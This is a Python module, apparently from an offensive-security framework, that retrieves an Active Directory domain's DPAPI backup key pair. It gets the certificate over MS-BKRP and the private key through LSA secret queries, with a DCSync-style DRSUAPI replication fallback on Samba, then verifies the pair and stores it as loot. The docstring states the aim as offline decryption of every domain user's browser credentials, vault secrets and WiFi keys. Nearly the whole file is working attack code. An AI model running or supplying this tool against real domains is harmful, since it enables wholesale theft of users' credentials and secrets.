"""DPAPI domain backup key: the master key for every domain DPAPI blob.

Every DPAPI masterkey a domain USER creates is wrapped with the domain
backup key pair — fetch the pair once (Domain Admin over BKRP + LDAP)
and every Chrome credential, vault secret, and WiFi key protected by
any domain account on any machine opens offline. This is the dploot
stage-1 primitive: cert + matching private key, looted and verified.

The pair comes from two places:
  1. BKRP (BackuprKey on \\protected_storage, RETRIEVE guid) — the
     domain backup-key CERTIFICATE (the public half; also proves the
     DC answers the protocol at all)
  2. the BCKUPKEY_<guid> Secret object's currentValue over LDAP — a
     PREFERRED_BACKUP_KEY blob holding the RSA private key blob +
     the same cert

The module pairs them (private key's public numbers == cert's) before
looting, so a wrong parse never masquerades as a win. Samba stores
the pair in the same layout — the lab verifies the whole path.
"""

import struct

from core.module import AuxiliaryModule
from core.options import OptAddress, OptString

try:
    from cryptography import x509
    from cryptography.hazmat.primitives import serialization
except ImportError:
    x509 = None
try:
    from impacket import crypto, dpapi
    from impacket.dcerpc.v5 import bkrp, lsad, transport
    from impacket.dcerpc.v5.rpcrt import (
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_AUTHN_WINNT,
    )
    from impacket.smbconnection import SMBConnection
    from impacket.uuid import bin_to_string
except ImportError:
    bkrp = None  # console gates run() on requirements


def parse_preferred_backup_key(blob):
    """(pkcs1_key, cert_der) out of a PREFERRED_BACKUP_KEY blob:
    Version(4) KeyLength(4) CertificateLength(4) then key blob + cert.
    The key is a Cryptodome RsaKey (impacket's pkcs1 conversion)."""
    preferred = dpapi.PREFERRED_BACKUP_KEY()
    preferred.fromString(blob)
    key_len = preferred["KeyLength"]
    cert_len = preferred["CertificateLength"]
    data = bytes(preferred["Data"])
    if key_len + cert_len != len(data):
        raise ValueError(f"length mismatch: header says "
                         f"{key_len}+{cert_len}, blob has {len(data)}")
    key_blob = dpapi.PRIVATE_KEY_BLOB(data[:key_len])
    return dpapi.privatekeyblob_to_pkcs1(key_blob), data[key_len:]


class DpapiBackupKey(AuxiliaryModule):
    name = "DPAPI Domain Backup Key (BKRP + BCKUPKEY)"
    description = """
        Retrieves the domain's DPAPI backup key PAIR: the certificate
        over MS-BKRP (protected_storage pipe) and the RSA private key
        from the BCKUPKEY_<guid> Secret object over LDAP. Verifies the
        pair matches, then loots both (type 'dpapi-backupkey') — the
        foundation for offline domain DPAPI decryption (Chrome creds,
        vaults, WiFi keys of any domain user). Domain Admin required.
    """
    authors = ["you"]
    requirements = ["impacket", "cryptography"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Domain Admin"))
        self.options.add(OptString("PASSWORD", required=True,
                                   description="Password"))

    def run(self):
        host = str(self.get_option("RHOSTS")).split(",")[0].strip()
        domain = str(self.get_option("DOMAIN"))
        user = str(self.get_option("USERNAME"))
        password = str(self.get_option("PASSWORD"))

        # 1. the cert, over BKRP
        try:
            conn = SMBConnection(host, host, sess_port=445, timeout=20)
            conn.login(user, password, domain)
        except Exception as e:
            self.print_error(f"{host}: SMB login failed - {e}")
            return
        try:
            rpctrans = transport.SMBTransport(
                host, filename=r"\protected_storage", smb_connection=conn)
            dce = rpctrans.get_dce_rpc()
            dce.set_credentials(user, password, domain)
            dce.set_auth_type(RPC_C_AUTHN_WINNT)
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(bkrp.MSRPC_UUID_BKRP)
            self.print_debug("BKRP bound; requesting the backup key cert")
            resp = bkrp.hBackuprKey(
                dce, bkrp.BACKUPKEY_RETRIEVE_BACKUP_KEY_GUID,
                bkrp.NULL if hasattr(bkrp, "NULL") else None)
            cert_der = b"".join(resp["ppDataOut"])
            dce.disconnect()
        except Exception as e:
            self.print_error(f"{host}: BKRP retrieve failed - {e}")
            conn.close()
            return
        finally:
            conn.close()
        try:
            cert = x509.load_der_x509_certificate(cert_der)
        except Exception as e:
            self.print_error(f"{host}: answer wasn't a cert "
                             f"({len(cert_der)} bytes) - {e}")
            return
        self.print_good(f"{host}: backup key cert: "
                        f"{cert.subject.rfc4514_string()} "
                        f"(serial {cert.serial_number:x})")

        # 2. the private key: LSA secret read on Windows, DRSUAPI
        # replication on Samba (see _read_secret for the why)
        blob = self._read_secret(host, domain, user, password)
        if blob is None:
            return

        # 3. parse + verify the pair matches
        try:
            key, blob_cert = parse_preferred_backup_key(blob)
        except Exception as e:
            self.print_error(f"{host}: backup key blob didn't parse - {e}")
            return
        cert_public = cert.public_key().public_numbers()
        if key.n != cert_public.n or key.e != cert_public.e:
            self.print_error(f"{host}: private key does NOT match the "
                             f"backup cert — refusing to loot a bad parse")
            return
        self.print_good(f"{host}: private key verified against the "
                        f"backup cert (RSA-{key.n.bit_length()})")

        # 4. loot
        key_pem = key.exportKey(format="PEM").decode()
        store = getattr(self.framework, "store", None)
        if store is not None:
            store.add_loot(
                "dpapi-backupkey",
                f"domain backup key pair @ {host}",
                ("# domain DPAPI backup key pair (cert + RSA private key)\n"
                 + cert.public_bytes(serialization.Encoding.PEM).decode()
                 + key_pem),
                address=host)
            self.print_status("cert+key saved as loot (PEM, type "
                              "dpapi-backupkey)")
    # -- session plumbing ---------------------------------------------------

    def _read_secret(self, host, domain, user, password):
        """The G$BCKUPKEY private-key blob. Two paths:

        LSA (Windows): LsarOpenSecret/LsarQuerySecret unwraps with the
        SMB session key — dploot's flow, works on real DCs.
        DRS (Samba): the LSA calls return nca_s_op_rng_error there, and
        the LDAP currentValue is confidential — but DRSUAPI replicates
        the object to anyone with replication rights, wrapped with the
        DRS bind's gensec key (RC4 over md5(key+confounder), crc32'd).
        """
        try:
            return self._read_secret_lsa(host, domain, user, password)
        except Exception as e:
            text = str(e)
            if "op_rng_error" in text or "NO_USER_SESSION_KEY" in text or \
                    "OBJECT_NAME_NOT_FOUND" in text:
                self.print_debug(f"{host}: LSA path unavailable ({text[:60]}); "
                                 f"falling back to DRS replication")
                return self._read_secret_drs(host, domain, user, password)
            self.print_error(f"{host}: LSA secret read failed - {e}")
            return None

    def _read_secret_lsa(self, host, domain, user, password):
        conn = SMBConnection(host, host, sess_port=445, timeout=20)
        conn.login(user, password, domain)
        try:
            rpctrans = transport.SMBTransport(host, filename=r"\lsarpc",
                                              smb_connection=conn)
            dce = rpctrans.get_dce_rpc()
            dce.set_credentials(user, password, domain)
            dce.set_auth_type(RPC_C_AUTHN_WINNT)
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(lsad.MSRPC_UUID_LSAD)
            policy = lsad.hLsarOpenPolicy2(
                dce, lsad.POLICY_GET_PRIVATE_INFORMATION)
            session_key = conn.getSessionKey()
            for keyname in ("G$BCKUPKEY_PREFERRED", "G$BCKUPKEY_P"):
                handle = lsad.hLsarOpenSecret(
                    dce, policy["PolicyHandle"], keyname,
                    lsad.SECRET_QUERY_VALUE)
                resp = lsad.hLsarQuerySecret(dce, handle["SecretHandle"])
                enc = bytes(resp["EncryptedCurrentValue"]["Buffer"])
                raw = crypto.decryptSecret(session_key, enc)
                guid = bin_to_string(raw)
                self.print_debug(f"backup key guid: {guid}")
                handle = lsad.hLsarOpenSecret(
                    dce, policy["PolicyHandle"], f"G$BCKUPKEY_{guid}",
                    lsad.SECRET_QUERY_VALUE)
                resp = lsad.hLsarQuerySecret(dce, handle["SecretHandle"])
                enc = bytes(resp["EncryptedCurrentValue"]["Buffer"])
                dce.disconnect()
                return crypto.decryptSecret(session_key, enc)
            dce.disconnect()
            self.print_error(f"{host}: no G$BCKUPKEY secret — the DC "
                             f"has no domain backup key pair")
            return None
        finally:
            conn.close()

    def _read_secret_drs(self, host, domain, user, password):
        from impacket.dcerpc.v5 import drsuapi
        from impacket.dcerpc.v5.dtypes import NULL
        from impacket.examples.secretsdump import RemoteOperations
        from impacket.ldap import ldap as impacket_ldap
        from impacket.ldap import ldapasn1

        # the object's GUID over LDAP (public attribute)
        lconn = impacket_ldap.LDAPConnection(f"ldap://{host}")
        lconn.login(user, password, domain)
        base = ",".join(f"DC={p}" for p in domain.split("."))
        guid = None
        for packet in lconn.search(
                searchBase=f"CN=System,{base}",
                searchFilter="(&(objectClass=secret)(cn=BCKUPKEY_*Secret))",
                attributes=["objectGUID", "cn"]):
            if not isinstance(packet, ldapasn1.SearchResultEntry):
                continue
            cn = ""
            for a in packet["attributes"]:
                t = str(a["type"])
                if t == "cn":
                    cn = str(a["vals"][0])
                elif t == "objectGUID":
                    guid = a["vals"][0].asOctets()
            if cn and "PREFERRED" not in cn.upper():
                self.print_debug(f"replicating {cn}")
                break
        lconn.close()
        if guid is None:
            self.print_error(f"{host}: no BCKUPKEY Secret object found")
            return None

        conn = SMBConnection(host, host, sess_port=445, timeout=20)
        conn.login(user, password, domain)
        try:
            ops = RemoteOperations(conn, doKerberos=False)
            ops._RemoteOperations__connectDrds()
            ds = drsuapi.DSNAME()
            ds["Guid"] = guid
            ds["Sid"] = b""
            ds["SidLen"] = 0
            ds["NameLen"] = 0
            ds["StringName"] = "\x00"
            ds["structLen"] = len(ds.getData())
            pas = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
            pas["dwVersion"] = 1
            pas["cAttrs"] = 1
            attr = drsuapi.ATTRTYP()
            attr["Data"] = _attid_for_oid("1.2.840.113556.1.4.27")
            pas["rgPartialAttr"].append(attr)
            drsr = ops.getDrsr()
            req = drsuapi.DRSGetNCChanges()
            req["hDrs"] = ops._RemoteOperations__hDrs
            req["dwInVersion"] = 8
            req["pmsgIn"]["tag"] = 8
            msg = req["pmsgIn"]["V8"]
            dsa = ops._RemoteOperations__NtdsDsaObjectGuid
            msg["uuidDsaObjDest"] = dsa
            msg["uuidInvocIdSrc"] = dsa
            msg["pNC"] = ds
            msg["usnvecFrom"]["usnHighObjUpdate"] = 0
            msg["usnvecFrom"]["usnHighPropUpdate"] = 0
            msg["pUpToDateVecDest"] = NULL
            msg["ulFlags"] = drsuapi.DRS_INIT_SYNC | drsuapi.DRS_WRIT_REP
            msg["cMaxObjects"] = 1
            msg["cMaxBytes"] = 0
            msg["ulExtendedOp"] = drsuapi.EXOP_REPL_OBJ
            msg["pPartialAttrSet"] = pas
            msg["PrefixTableDest"]["PrefixCount"] = 0
            msg["pPartialAttrSetEx1"] = NULL
            resp = drsr.request(req, checkError=False)
            out = resp["pmsgOut"]["V%d" % resp["pdwOutVersion"]]
            if out["cNumObjects"] == 0:
                self.print_error(f"{host}: replication returned no object "
                                 f"(extended_ret={out['ulExtendedRet']})")
                return None
            a = out["pObjects"]["Entinf"]["AttrBlock"]["pAttr"][0]
            val = a["AttrVal"]["pAVal"][0]["pVal"]
            val = b"".join(val) if isinstance(val, list) else bytes(val)
            return unwrap_drs_secret(drsr.get_session_key(), val)
        finally:
            conn.close()


def _attid_for_oid(oid):
    """ATTRTYP in the standard DRS prefix encoding (dcsync's form)."""
    last = int(oid.split(".")[-1])
    lower = last % 16384
    if last >= 16384:
        lower += 32768
    return (0x0009 << 16) + lower


def unwrap_drs_secret(gensec_key, blob):
    """Samba's DRS secret wrap (libcli/drsuapi/repl_decrypt.c):
    16-byte confounder, then RC4(md5(gensec_key + confounder)) over
    crc32(4) + plaintext. Verifies the crc — a wrong key never looks
    like a win."""
    import hashlib
    import zlib
    from Cryptodome.Cipher import ARC4
    confounder, ciphertext = blob[:16], blob[16:]
    md5 = hashlib.new("md5")
    md5.update(gensec_key + confounder)
    plain = ARC4.new(md5.digest()).decrypt(ciphertext)
    crc_given = int.from_bytes(plain[:4], "little")
    if crc_given != (zlib.crc32(plain[4:]) & 0xFFFFFFFF):
        raise ValueError("crc mismatch — wrong session key or corrupt blob")
    return plain[4:]
